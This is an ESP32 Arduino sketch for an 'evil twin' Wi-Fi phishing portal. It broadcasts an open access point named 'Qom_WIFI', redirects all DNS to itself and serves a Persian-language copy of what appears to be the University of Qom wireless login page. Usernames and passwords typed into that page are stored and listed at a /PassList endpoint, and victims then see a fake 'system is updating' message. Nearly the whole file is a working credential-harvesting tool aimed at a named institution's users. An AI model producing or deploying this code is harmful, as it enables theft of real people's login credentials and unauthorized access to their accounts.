// Libraries
#include <WiFi.h>
#include <DNSServer.h> 
#include <WebServer.h>
#include <EEPROM.h>
#define LED_BUILTIN 2

const char* SSID_NAME = "Qom_WIFI";

#define SUBTITLE "Confidential"
#define TITLE "Update"
#define BODY "Your router firmware is out of date. Update your firmware to continue browsing normally."
#define POST_TITLE "Updating..."
#define POST_BODY "Your router is being updated. Please, wait until the proccess finishes.</br>Thank you."
#define PASS_TITLE "Passwords"
#define CLEAR_TITLE "Cleared"

const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(172, 0, 0, 1);

String allUsername = "";
String allPass = "";
String Username_Pass = "";
String newSSID = "";
String currentSSID = "";

int initialCheckLocation = 20; 
int passStart = 30;
int passEnd = passStart;

unsigned long bootTime=0, lastActivity=0, lastTick=0, tickCtr=0;
DNSServer dnsServer; WebServer webServer(80);

String input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<","&lt;");a.replace(">","&gt;");
  a.substring(0,200); return a; }

String footer() { 
  return "</div><div class=q><a>&#169; All rights reserved.</a></div>";
}

String header(String t) {
  String a = String(currentSSID);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }" 
    "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
    "div { padding: 0.5em; }"
    "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
    "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; border-radius: 10px; }"
    "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
    "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
    "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
    "textarea { width: 100%; }";
  String h = "<!DOCTYPE html><html>"
    "<head><title>" + a + " :: " + t + "</title>"
    "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
    "<style>" + CSS + "</style>"
    "<meta charset=\"UTF-8\"></head>"
    "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
  return h; }

String index() {
    String htmlCode = "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">"
    "<html>"
    "<head>"
    "<meta http-equiv=\"content-type\" content=\"text/html; charset=UTF-8\" />"
    "<meta http-equiv=\"pragma\" content=\"no-cache\" />"
    "<meta http-equiv=\"expires\" content=\"-1\" />"
    "<meta name=\"viewport\" content=\"width=device-width; initial-scale=1.0; maximum-scale=1.0;\" />"
    "<link href=\"css/style.css\" rel=\"stylesheet\" type=\"text/css\" />"
    "<title>اینترنت وایرلس دانشگاه قم</title>"
    "</head>"
    "<body style=\"background: #CFF; -webkit-background-size: cover; -moz-background-size: cover; background-size: cover; font-weight: 300; text-align: left; text-decoration: none; text-shadow: 2px 2px 2px rgba(0, 0, 0, 0.5); color: #ffffff;\">"
    "<form name=\"login\" class=\"login-form\" action=/login method=post onSubmit=\"return doLogin()\" style=\"width: 300px; margin: 0 auto; position: absolute; z-index: 5; background-color: rgba(0, 104, 155, 0.76); border-radius: 5px; -moz-border-radius: 5px; box-shadow: 0 1px 3px rgba(0, 0, 0, 0.5); -moz-box-shadow: 0 1px 3px rgba(0, 0, 0, 0.5); -webkit-box-shadow: 0 1px 3px rgba(0, 0, 0, 0.5); top: 50%; right: 0; left: 0; transform: translateY(-50%);\">"
    "<div class=\"content\" style=\"padding: 20px 30px 25px 30px;\">"
    "<input type=\"hidden\" name=\"dst\" value=\"\" />"
    "<input type=\"hidden\" name=\"popup\" value=\"true\" />"
    "<input name=username_user type=\"text\" required=\"required\" placeholder=\"نام کاربری خود را وارد نمایید\" class=\"login-input\" onfocus=\"this.value=''\" size=\"30\" style=\"width: 93%; padding: 10px; text-align: center; border-radius: 5px; text-shadow: 1px 2px 2px rgba(0, 0, 0, 0.25); border: 1px solid #D0D0D0; margin: 5px 0; font-family: 'BYekan', Tahoma; transition: 0.5s ease all; border-bottom: 3px solid #D0D0D0; border-top: 3px solid #ffffff; box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.5); -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.5); -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.5); -webkit-appearance: none;\" />"
    "<input name=password_user type=\"password\" required=\"required\" placeholder=\"رمز عبور خود را وارد نمایید\" class=\"login-input\" onfocus=\"this.value=''\" size=\"30\" style=\"width: 93%; padding: 10px; text-align: center; border-radius: 5px; text-shadow: 1px 2px 2px rgba(0, 0, 0, 0.25); border: 1px solid #D0D0D0; margin: 5px 0; font-family: 'BYekan', Tahoma; transition: 0.5s ease all; border-bottom: 3px solid #D0D0D0; border-top: 3px solid #ffffff; box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.5); -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.5); -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.5); -webkit-appearance: none;\" />"
    "<button class=\"login-btn\" type=\"submit\" style=\"text-align: center; display: block; margin: 0 auto; width: 200px; padding: 10px; border: none; background-color: #00B7E6; font-family: 'BYekan'; font-size: 18px; border-radius: 5px; text-shadow: 1px 2px 1px rgba(0, 0, 0, 0.5); color: #fff; margin-top: 15px; cursor: pointer; transition: 0.5s ease all; border-bottom: 4px solid #0798BD; box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.5); -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.5); -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.5); -webkit-appearance: none;\">اتصال</button>"
    "<font color=\"#AC2925\">"
    "<center></center>"
    "</font>"
    "<div class=\"TextCenter\" style=\"text-align: center;\">"
    "<a href=\"http://QomWiFi.ir/Guide/UniQom/\" style=\"text-decoration: none; color: inherit; display: block; background-color: #fffc22; border-radius: 10px; margin-top: 5px; color: black;\">راهنمای اتصال</a>"
    "<a href=\"https://lra.jahan-nama.com/\" style=\"text-decoration: none; color: inherit; display: block; background-color: #fffc22; border-radius: 10px; margin-top: 5px; color: black;\">پنل کاربری</a>"
    "<a href=\"http://speed.qomwifi.ir/\" style=\"text-decoration: none; color: inherit; display: block; background-color: #fffc22; border-radius: 10px; margin-top: 5px; color: black;\">سنجش سرعت اینترنت</a>"
    "<a href=\"https://eitaa.com/ParsianWiFi\" style=\"text-decoration: none; color: inherit; display: block; background-color: #fffc22; border-radius: 10px; margin-top: 5px; color: black;\">پشتیبانی ایتا</a>"
    "<a href=\"tel:+982532857767\" style=\"text-decoration: none; color: inherit; display: block; background-color: #fffc22; border-radius: 10px; margin-top: 5px; color: black;\">پشتیبانی تلفنی</a>"
    "</div>"
    "<style>"
    ".TextCenter a {"
    "display: block;"
    "background-color: #fffc22;"
    "border-radius: 10px;"
    "margin-top: 5px;"
    "color: black;"
    "}"
    "</style>"
    "</div>"
    "</form>"
    "</body>"
    "</html>";
    return htmlCode;
}

String allUsersAndPasswords() {
  String result = "<ol>";
  
  result += Username_Pass;
  
  result += "</ol>"; 
  
  return header("Information:") + result + footer();
}

String postedUsernamePassword() {
  String username = input("username_user");
  String password = input("password_user");
  String data = "<li><b>Username: " + username + " | Password: " + password + "</b></li>";

 
  Username_Pass += data;
  String htmlContent = "<body>\n"
                      "<html>\n"
                      "<head>\n"
                      "<title>وضعیت اتصال</title>\n"
                      "<link href=\"css/font-awesome.min.css\" type=\"text/css\" rel=\"stylesheet\">\n"
                      "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n"
                      "<meta http-equiv=\"refresh\" content=\"60\">\n"
                      "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n"
                      "<meta http-equiv=\"pragma\" content=\"no-cache\">\n"
                      "<meta http-equiv=\"expires\" content=\"-1\">\n"
                      "<link href=\"css/style.css\" rel=\"stylesheet\" type=\"text/css\" />\n"
                      "</head>\n"
                      "<body style=\"background: #CFF;\n"
                      "-webkit-background-size: cover;\n"
                      "-moz-background-size: cover;\n"
                      "background-size: cover;\n"
                      "font-weight: 300;\n"
                      "text-align: left;\n"
                      "text-decoration: none;\n"
                      "text-shadow: 2px 2px 2px rgba(0, 0, 0, 0.5);\n"
                      "color: #ffffff;\" bottommargin=\"0\" topmargin=\"0\" leftmargin=\"0\" rightmargin=\"0\">\n"
                      "<div id=\"login-box\"\n"
                      "style=\"width: 330px;\n"
                      "height: 400px;\n"
                      "background-color: rgba(34, 44, 50, 0.5);\n"
                      "margin: 0 auto;\n"
                      "margin-top: 100px;\n"
                      "padding: 30px;\n"
                      "border-radius: 5px;\n"
                      "box-shadow: 1px 2px 3px rgba(0, 0, 0, 0.25);\n"
                      "-moz-box-shadow: 1px 2px 3px rgba(0, 0, 0, 0.25);\n"
                      "-webkit-box-shadow: 1px 2px 3px rgba(0, 0, 0, 0.25));\">\n"
                      "<table width=\"100%\" height=\"100%\" style=\"\">\n"
                      "<tr>\n"
                      "<td align=\"center\" valign=\"middle\">\n"
                      "<form action=\"http://login.qomwifi.ir/logout\" name=\"logout\" onSubmit=\"return openLogout()\" style=\"display: block;\n"
                      "margin-top: 0em;\n"
                      "unicode-bidi: isolate;\n"
                      "margin-block-end: 1em;\">\n"
                      "<table border=\"1\" class=\"tabula\">\n"
                      "<br>\n"
                      "<div style=\"text-align: center;\"><b>خوش آمدید<br></b> " + input("username_user") + "!</div>\n"
                      "<br>\n"
                      "<p style=\"direction: rtl;\">درحال بروزرسانی و ارتقا سامانه هستیم...<br /> <br /> لطفا فردا وصل شوید [:</p>\n"
                      "</table>\n"
                      "<br>\n"
                      "<button class=\"logout-btn\" type=\"submit\"\n"
                      "style=\"text-align: center;\n"
                      "display: block;\n"
                      "margin: 0 auto;\n"
                      "width: 200px;\n"
                      "padding: 10px;\n"
                      "border: none;\n"
                      "background-color: #CA0000;\n"
                      "font-family: 'BYekan';\n"
                      "font-size: 18px;\n"
                      "border-radius: 5px;\n"
                      "text-shadow: 1px 2px 1px rgba(0, 0, 0, 0.5);\n"
                      "color: #fff;\n"
                      "margin-top: 15px;\n"
                      "cursor: pointer;\n"
                      "transition: 0.5s ease all;\n"
                      "border-bottom: 4px solid #b10000;\n"
                      "box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.5);\n"
                      "-moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.5);\n"
                      "-webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.5);\n"
                      "-webkit-appearance: none;\">قـــطـــع اتــــصـــال\t<i class=\"fa fa-sign-out fa-lg\"></i></button>\n"
                      "<div class=\"TextCenter\">\n"
                      "<a href=\"http://speed.qomwifi.ir/\"\n"
                      "style=\"text-decoration: none;\n"
                      "color: inherit;\n"
                      "display: block;\n"
                      "background-color: #fffc22;\n"
                      "border-radius: 10px;\n"
                      "margin-top: 5px;\n"
                      "color: black;\">سنجش سرعت اینترنت</a>\n"
                      "<a href=\"http://lra.jahan-nama.com/\"\n"
                      "style=\"text-decoration: none;\n"
                      "color: inherit;\n"
                      "display: block;\n"
                      "background-color: #fffc22;\n"
                      "border-radius: 10px;\n"
                      "margin-top: 5px;\n"
                      "color: black;\">پنل کاربری</a>\n"
                      "<a href=\"tel:+982537138\"\n"
                      "style=\"text-decoration: none;\n"
                      "color: inherit;\n"
                      "display: block;\n"
                      "background-color: #fffc22;\n"
                      "border-radius: 10px;\n"
                      "margin-top: 5px;\n"
                      "color: black;\">تماس با پشتیبانی</a>\n"
                      "</div>\n"
                      "<style>\n"
                      ".TextCenter a{\n"
                      "display: block;\n"
                      "background-color: #fffc22;\n"
                      "border-radius: 10px;\n"
                      "margin-top: 5px;\n"
                      "color: black;\n"
                      "}\n"
                      "</style>\n"
                      "</form>\n"
                      "</td>\n"
                      "</table>\n"
                      "</div>\n"
                      "</body>\n"
                      "</html>\n";
  
  return htmlContent;
}

String clear() {
  Username_Pass = "";
  passEnd = passStart;
  EEPROM.write(passEnd, '\0');
  EEPROM.commit();
  return header(CLEAR_TITLE) + "<div><p>The username and password lists have been reseted.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
}


void BLINK() {
  for (int counter = 0; counter < 10; counter++)
  {
    digitalWrite(LED_BUILTIN, counter % 2);
    delay(500);
  }
}

void setup() {
  // Serial begin
  Serial.begin(115200);
  
  bootTime = lastActivity = millis();
  EEPROM.begin(512);
  delay(10);

  String checkValue = "first";

  for (int i = 0; i < checkValue.length(); ++i)
  {
    if (char(EEPROM.read(i + initialCheckLocation)) != checkValue[i])
    {
      for (int i = 0; i < checkValue.length(); ++i)
      {
        EEPROM.write(i + initialCheckLocation, checkValue[i]);
      }
      EEPROM.write(0, '\0');
      EEPROM.write(passStart, '\0');
      EEPROM.commit();
      break;
    }
  }
  
  String ESSID;
  int i = 0;
  while (EEPROM.read(i) != '\0') {
    ESSID += char(EEPROM.read(i));
    i++;
  }

  while (EEPROM.read(passEnd) != '\0')
  {
    allPass += char(EEPROM.read(passEnd));
    passEnd++;
  }
  
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));

  currentSSID = ESSID.length() > 1 ? ESSID.c_str() : SSID_NAME;

  Serial.print("Current SSID: ");
  Serial.print(currentSSID);
  WiFi.softAP(currentSSID);  

  dnsServer.start(DNS_PORT, "*", APIP);
  webServer.on("/login", HTTP_POST, []() { webServer.send(200, "text/html", postedUsernamePassword()); BLINK(); });
  webServer.on("/PassList", HTTP_GET, []() { webServer.send(200, "text/html", allUsersAndPasswords()); });
  webServer.on("/clear", HTTP_GET, []() { webServer.send(200, "text/html", clear()); });
  webServer.onNotFound([]() { lastActivity=millis(); webServer.send(200, "text/html", index()); });
  webServer.begin();

  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, HIGH);
}


void loop() { 
  if ((millis() - lastTick) > TICK_TIMER) {lastTick = millis();} 
dnsServer.processNextRequest(); webServer.handleClient(); }
